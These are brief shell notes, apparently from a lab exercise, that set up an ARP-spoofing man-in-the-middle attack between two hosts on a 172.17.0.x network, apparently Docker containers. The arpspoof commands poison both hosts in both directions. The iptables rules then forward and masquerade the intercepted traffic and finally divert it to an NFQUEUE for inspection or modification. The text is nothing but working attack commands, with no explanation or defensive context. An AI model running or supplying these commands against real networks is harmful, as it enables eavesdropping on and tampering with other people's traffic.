INIT di arpspoof:
arpspoof -i eth0 -t 172.17.0.3 172.17.0.2 & arpspoof -i eth0 -t 172.17.0.2 172.17.0.3 &

MITM:
iptables -A FORWARD -i eth0 -j ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

iptables -D FORWARD -i eth0 -j ACCEPT
iptables -A FORWARD -j NFQUEUE --queue-num 0

